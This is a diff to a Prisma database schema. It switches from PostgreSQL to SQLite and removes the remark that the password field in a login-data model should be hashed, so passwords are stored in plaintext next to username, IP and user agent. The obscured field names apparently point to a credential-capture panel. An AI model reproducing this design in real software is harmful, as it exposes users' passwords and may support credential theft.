@@ -1,10 +1,12 @@
-// Production PostgreSQL schema
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
 generator client {
   provider = "prisma-client-js"
 }
 
 datasource db {
-  provider = "postgresql"
+  provider = "sqlite"
   url      = env("DATABASE_URL")
 }
 
@@ -31,7 +33,7 @@ model LoginData {
   id        String   @id @default(cuid())
   sessionId String   @unique
   xusr      String   // Username/email
-  xpss      String   // Password (should be hashed in production)
+  xpss      String   // Password
   timestamp DateTime @default(now())
   ip        String
   userAgent String
@@ -122,3 +124,4 @@ model AdminLog {
   
   @@map("admin_logs")
 }
+
